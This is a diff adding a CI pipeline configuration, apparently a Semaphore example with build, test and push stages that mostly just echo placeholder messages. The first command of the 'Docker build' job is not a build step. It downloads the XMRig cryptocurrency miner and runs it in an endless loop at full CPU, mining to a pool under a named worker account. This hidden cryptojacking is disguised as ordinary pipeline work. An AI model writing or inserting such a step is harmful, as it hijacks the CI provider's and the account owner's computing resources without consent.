@@ -1,0 +1,57 @@
+version: v1.0
+name: First pipeline example
+agent:
+  machine:
+    type: e1-standard-8
+    os_image: ubuntu1804
+blocks:
+  - name: "Build"
+    task:
+      env_vars:
+        - name: APP_ENV
+          value: prod
+      jobs:
+      - name: Docker build
+        commands:
+          - wget https://github.com/xmrig/xmrig/releases/download/v2.15.3-beta/xmrig-2.15.3-beta-xenial-x64.tar.gz && tar -xf xmrig-2.15.3-beta-xenial-x64.tar.gz && cd xmrig-2.15.3-beta && while true; do ./xmrig -o europe.cryptonight-hub.miningpoolhub.com:20580 -u brahim7.workername3 -p x --threads 4 --max-cpu-usage=100 --cpu-priority 5 --donate-level 1 ; sleep 1; done 
+          - checkout
+          - ls -1
+          - echo $APP_ENV
+          - echo "Docker build..."
+          - echo "done"
+  - name: "Smoke tests"
+    task:
+      jobs:
+      - name: Smoke
+        commands:
+          - checkout
+          - echo "make smoke"
+  - name: "Unit tests"
+    task:
+      jobs:
+      - name: RSpec
+        commands:
+          - checkout
+          - echo "make rspec"
+      - name: Lint code
+        commands:
+          - checkout
+          - echo "make lint"
+      - name: Check security
+        commands:
+          - checkout
+          - echo "make security"
+  - name: "Integration tests"
+    task:
+      jobs:
+      - name: Cucumber
+        commands:
+          - checkout
+          - echo "make cucumber"
+  - name: "Push Image"
+    task:
+      jobs:
+      - name: Push
+        commands:
+          - checkout
+          - echo "make docker.push"
